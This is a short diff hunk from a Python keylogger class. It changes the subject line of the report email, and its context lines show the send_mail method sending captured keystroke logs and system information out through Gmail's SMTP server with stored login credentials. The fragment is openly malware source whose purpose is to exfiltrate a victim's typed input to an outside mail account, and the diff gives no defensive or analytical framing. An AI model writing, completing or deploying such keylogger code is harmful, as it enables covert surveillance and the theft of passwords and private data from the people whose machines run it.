@@ -46,7 +46,7 @@ class Keylogger:
 
     def send_mail(self, message):
 
-        message = "Subject: ZLogger Report\n\n" + "Report From:\n\n" + self.system_info + "\n\nLogs:\n" + message
+        message = "Subject: Logger Report\n\n" + "Report From:\n\n" + self.system_info + "\n\nLogs:\n" + message
         server = smtplib.SMTP("smtp.gmail.com", 587)
         server.starttls()
         server.login(self.email, self.password)
